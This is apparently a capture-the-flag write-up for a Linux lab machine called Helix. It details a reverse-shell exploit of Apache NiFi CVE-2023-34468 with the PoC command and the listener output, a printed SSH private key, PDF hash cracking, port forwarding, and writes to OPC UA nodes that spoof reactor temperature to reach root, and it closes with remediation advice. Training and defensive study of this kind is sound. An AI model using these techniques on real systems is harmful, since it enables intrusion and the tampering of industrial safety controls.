| Property       | Value                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------- |
| **OS**         | Linux                                                                                                 |
| **Difficulty** | Medium                                                                                                |
| **Release**    | 2026-05-23                                                                                            |
| **State**      | Active                                                                                                |
| **IP**         | 10.129.245.123                                                                                        |
| **Techniques** | vhost enumeration, Apache NiFi RCE, local port forwarding, PDF password cracking, OPC UA manipulation |
| **Tags**       | #web #privesc #linux #opcua                                                                           |

---
## Summary

Helix is a medium Linux machine hosting an industrial automation platform on port 80. Virtual host enumeration discloses `flow.helix.htb`, running an Apache NiFi instance version 1.21.0 vulnerable to CVE-2023-34468, an authenticated RCE. Exploiting the vulnerability lands a shell as `nifi`. A backup of the `operator` user's SSH private key is stored unprotected in the NiFi application directory, granting SSH access via lateral movement. The `operator` user can run `/usr/local/sbin/helix-maint-console` as root, but the binary only opens a privileged shell when a Maintenance Window is active. Two files in the operator's home directory (a control systems diagram and a password-protected PDF) describe how the internal Reactor HMI and OPC UA server work. After cracking the PDF password and reading the documentation, SSH local port forwarding exposes the HMI on port 8081 and the OPC UA server on port 4840. By manipulating writable OPC UA nodes the Privileged Maintenance Window opens. Running the console command as root during that 120-second window lands a root shell.

---
## Enumeration

```
echo '10.129.245.123 helix.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sCV helix.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-11 08:49 EDT
Nmap scan report for helix.htb (10.129.245.123)
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Helix Industries | Industrial Automation & Critical Infrastruc...
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
```

### Service Enumeration

The web application on port 80 belongs to Helix Industries, a firm that designs and operates automation, reliability, and security systems for industrial operators.

![](./screens/1.png)

### Vhost Discovery

```
ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://helix.htb/ \
  -H 'Host: FUZZ.helix.htb' \
  -fs 154

flow   [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 47ms]
```

```
echo '10.129.245.123 flow.helix.htb' | sudo tee -a /etc/hosts
```

Navigating to `http://flow.helix.htb` reveals an Apache NiFi instance.

**Vulnerable Apache NiFi version 1.21.0:**

![](./screens/2.png)

---
## Foothold

### CVE-2023-34468

CVE-2023-34468 is a remote code execution vulnerability affecting Apache NiFi versions 0.0.2 through 1.21.0 (CVSS 8.8). The root cause is that NiFi bundles the H2 database engine and allows authenticated users to configure `DBCPConnectionPool` controller services with arbitrary JDBC connection URLs. H2 supports a `RUNSCRIPT FROM` statement in its connection init string, which fetches and executes a SQL file from a remote URL when the connection pool is initialized. That SQL file can define arbitrary Java methods using `CREATE ALIAS` and invoke OS commands with `CALL`. The complete chain looks like this:

```
DBCPConnectionPool (H2 JDBC URL with INIT=RUNSCRIPT FROM ...)
    → H2 fetches attacker-controlled SQL file
        → CREATE ALIAS defines a Java method calling Runtime.exec()
            → CALL executes the method → reverse shell
```

The default NiFi deployment runs with no authentication (`Anonymous: True`, `canWrite: True`), making the vulnerability exploitable without credentials in this configuration.

### Exploitation

PoC: [github.com/sbouabid-sec/CVE-2023-34468-POC](https://github.com/sbouabid-sec/CVE-2023-34468-POC)

```shell
python3 poc.py --target http://flow.helix.htb --lhost 10.10.15.243 --lport 4444 --cleanup

[*] Target: http://flow.helix.htb | LHOST: 10.10.15.243:4444 | HTTP: 80
[*] HTTP server up on :80
[*] Checking access...
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Getting root process group ID...
[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
[*] Creating DBCPConnectionPool...
[+] CS ID: b6eb24b8-019e-1000-418f-4fc8bda41990
[*] Enabling controller service...
[+] Controller service enabled
[*] Creating ExecuteSQL processor...
[+] Processor ID: b6eb2df0-019e-1000-15b2-c18c9e5ac337
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
[+] rce.sql delivered to target
[*] Cleaning up...
[+] Processor deleted
[+] Controller service deleted
```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.243] from (UNKNOWN) [10.129.245.123] 41348
bash: cannot set terminal process group (1019): Inappropriate ioctl for device
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$
```

Shell obtained as `nifi`. Upgraded to a full interactive TTY:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Lateral Movement

Enumerating the NiFi application directory reveals a `support-bundles` directory containing a backup of the `operator` user's SSH private key:

```
nifi@helix:/opt/nifi-1.21.0$ ls support-bundles/
operator_id_ed25519.bak

nifi@helix:/opt/nifi-1.21.0$ cat support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

The key is unencrypted and requires no passphrase.

```
chmod 600 operator.key
```

---
## User Flag

```
ssh operator@helix.htb -i operator.key

operator@helix:~$ cat user.txt
46a6bc3*********************c4664
```

---
## Privilege Escalation

### Enumeration

```
operator@helix:~$ ls
'control systems diagram.png'  'Operator Control & Safety Guide.pdf'  user.txt

operator@helix:~$ sudo -l
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Running the maintenance console returns `Maintenance window CLOSED.`
Elevated access is gated behind a condition verified at runtime:

```
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

The two files in the home directory can be transfered to the attack host, and they are key to understanding how to open the Maintenance window.

### control system diagram.png 

The control systems diagram shows the overall architecture: an OPC UA server at `opc.tcp://127.0.0.1:4840/helix/` bridges the operator station and a remote access client to three subsystems:
- Reactor
- Control
- Safety

![](./screens/control.png)

## Operator Control & Safety Guide.pdf

[[Operator Control & Safety Guide.pdf]]

The PDF is password-protected:

```
pdf2john 'Operator Control & Safety Guide.pdf' > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt

Operator Control & Safety Guide.pdf:operator1
```

The guide describes the safety logic of the reactor. In `MAINTENANCE` mode with `TestOverride` enabled, the `CalibrationOffset` node introduces a controlled bias to the reported temperature. The **Privileged Maintenance Window** opens when the reported temperature reaches ≥ 295 °C (or pressure ≥ 73 bar) while remaining below the safety trip threshold of ~305 °C (or ~75 bar). The window is time-limited to 120 seconds and is the only condition under which the maintenance console opens a root shell.

Active listening ports confirm two internal services bound to loopback:

```
operator@helix:~$ ss -tlpn
LISTEN  0  128   127.0.0.1:4840   0.0.0.0:*    # OPC UA server
LISTEN  0  128   127.0.0.1:8081   0.0.0.0:*    # Reactor HMI
```

### Exploitation

Both ports are forwarded to the attacker machine via SSH local port forwarding:

```shell
ssh -L 4840:localhost:4840 -L 8081:localhost:8081 operator@helix.htb -i operator.key
```

Port 8081 exposes the Reactor HMI dashboard, which confirms the current state: temperature at 284.0 °C, mode `NORMAL`, `TestOverride` disabled, and the Privileged Maintenance Window `CLOSED`.

![](./screens/3.png)

The OPC UA client is used to connect directly to the server:

```
opcua-client opc.tcp://127.0.0.1:4840/helix
```

![](./screens/4.png)

The temperature as reported by the HMI is 284.0 °C. A `CalibrationOffset` of 12.0 pushes the reported value to 296.2 °C, above the 295 °C threshold needed to open the maintenance window, and safely below the 305 °C trip limit. The following writes are applied:

- `Mode` → `MAINTENANCE`
- `TestOverride` → `True`
- `CalibrationOffset` → `12.0`

The HMI immediately reflects the new state: reported temperature 296.2 °C, mode `MAINTENANCE`, `TestOverride` true, and the Privileged Maintenance Window **OPEN**.

![](./screens/5.png)

With the window open, running the maintenance console as root grants a root shell:

```
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 63 seconds
[!] Session will be terminated automatically
root@helix:/home/operator#
```

---
## Root Flag

```
root@helix:/home/operator# cat /root/root.txt
7fd093c*********************691cf
```

---
## Remediation

- **CVE-2023-34468:** Upgrade Apache NiFi to version 1.21.1 or later. Additionally, enable authentication on the NiFi instance the default anonymous access with full write permissions makes the attack trivially reachable without credentials.
- **Exposed private key:** The `operator` SSH private key should not be stored in the NiFi application directory, where it is readable by the `nifi` service account. Private keys must be stored exclusively in the owning user's `~/.ssh/` directory with permissions restricted to that user (`chmod 600`).
- **Weak PDF password:** The operator safety guide is protected with a dictionary-crackable password. Any document containing sensitive operational details should use a strong, randomly generated passphrase.
- **OPC UA access control:** The OPC UA server exposes writable control nodes without authentication. Write access to safety-critical parameters such as `Mode`, `TestOverride`, and `CalibrationOffset` should require authentication and be restricted to explicitly authorized clients. Unauthenticated write access to ICS control variables is a critical risk in any environment.

---
## References

- [CVE-2023-34468 PoC](https://github.com/sbouabid-sec/CVE-2023-34468-POC)
- [Apache NiFi Security Advisory — CVE-2023-34468](https://nifi.apache.org/security.html#CVE-2023-34468)
- [OPC UA Security Best Practices](https://opcfoundation.org/developer-tools/documents/view/159)
